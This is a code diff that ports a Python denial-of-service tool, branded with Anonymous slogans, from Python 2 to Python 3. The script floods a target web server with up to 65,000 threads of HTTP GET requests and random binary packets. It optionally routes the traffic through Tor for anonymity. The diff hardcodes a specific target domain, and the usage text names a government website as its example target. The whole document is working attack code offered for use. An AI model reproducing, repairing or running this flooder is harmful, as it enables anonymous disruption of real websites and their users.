@@ -209,8 +209,8 @@ class httpPost(Thread):
         self.running = True
        
     def _send_http_get(self, pause = random.randrange(1, 10)):
-    global stop_now
-    self.socks.send("GET / HTTP/1.1\r\n"
+        global stop_now
+        self.socks.send("GET / HTTP/1.1\r\n"
             "Host: %s\r\n"
             "User-Agent: %s\r\n"
             "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
@@ -231,9 +231,9 @@ class httpPost(Thread):
         data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
         packet = random.choice(data)
         magic = random.choice(packet+p)
-            print term.BOL+term.UP+term.CLEAR_EOL+"SENDING PACKETS!: %s" % magic+term.NORMAL
-            self.socks.send(magic)
-            time.sleep(random.uniform(0.1, 3))
+        print(term.BOL+term.UP+term.CLEAR_EOL+"SENDING PACKETS!: %s" % magic+term.NORMAL)
+        self.socks.send(magic)
+        time.sleep(random.uniform(0.1, 3))
    
         self.socks.close()
        
@@ -242,39 +242,39 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:
-            self.socks = socks.socksocket()
+                        self.socks = socks.socksocket()
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Stressing target!!"+ term.NORMAL
+                    print (term.BOL+term.UP+term.CLEAR_EOL+"Stressing target!!"+ term.NORMAL)
                     break
-                except Exception, e:
+                except Exception as e:
                     if e.args[0] == 106 or e.args[0] == 60:
                         break
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Failed - Make sure you removed http://"+ term.NORMAL
+                    print(term.BOL+term.UP+term.CLEAR_EOL+"Failed - Make sure you removed http://"+ term.NORMAL)
                     time.sleep(1)
                     continue
    
             while self.running:
                 try:
                     self._send_http_get()
-                except Exception, e:
+                except Exception as e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL                      
-            self.socks = socks.socksocket()
-                        break
-                    time.sleep(1)
-                    pass
+                        print(term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL)
+                    self.socks = socks.socksocket()
+                    break
+                time.sleep(1)
+                pass
  
 def usage():
-    print "./asunderdos.py -t <target> [-r <threads> -p <port> -T -h]"
-    print "---Asund3r---"
-    print " Make sure you don't execute with http:// in your url"
-    print " -t|--target <Hostname|IP>"
-    print " -r|--threads <Number of threads> Defaults to 65000"
-    print " -p|--port <Web Server Port> Defaults to 80"
-    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
-    print " -h|--help Shows this help\n"
-    print "Eg. ./asundos.py -t www.justice.govt.nz -r 65000\n"
+    print ("./asunderdos.py -t <target> [-r <threads> -p <port> -T -h]")
+    print ("---Asund3r---")
+    print (" Make sure you don't execute with http:// in your url")
+    print (" -t|--target <Hostname|IP>")
+    print (" -r|--threads <Number of threads> Defaults to 65000")
+    print (" -p|--port <Web Server Port> Defaults to 80")
+    print (" -T|--tor Enable anonymising through tor on 127.0.0.1:9050")
+    print (" -h|--help Shows this help\n")
+    print ("Eg. ./asundos.py -t www.justice.govt.nz -r 65000\n")
  
 def main(argv):
    
@@ -286,7 +286,7 @@ def main(argv):
  
     global stop_now
    
-    target = ''
+    target = 'webility.cf'
     threads = 65000
     tor = True
     port = 80
@@ -308,11 +308,11 @@ def main(argv):
         usage()
         sys.exit(-1)
  
-    print term.DOWN + term.RED + "/*" + term.NORMAL
-    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
-    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
-    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
-    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL
+    print (term.DOWN + term.RED + "/*" + term.NORMAL)
+    print (term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL)
+    print (term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL)
+    print (term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL)
+    print (term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)
  
     rthreads = []
     for i in range(threads):
@@ -324,18 +324,18 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nShutting down threads...\n"
+            print ("\nShutting down threads...\n")
             for t in rthreads:
                 stop_now = True
                 t.running = False
  
 if __name__ == "__main__":
-    print "\n/*"
-    print " *"+term.GREEN + "Anonymous"
-    print " * We Do Not Forgive"
-    print " * We Do Not Forget"
-    print " * We are The Voice of the Voiceless "
-    print " * We Are Legion"
-    print " */\n"
+    print ("\n/*")
+    print (" *"+term.GREEN + "Anonymous")
+    print (" * We Do Not Forgive")
+    print (" * We Do Not Forget")
+    print (" * We are The Voice of the Voiceless ")
+    print (" * We Are Legion")
+    print (" */\n")
  
     main(sys.argv[1:])
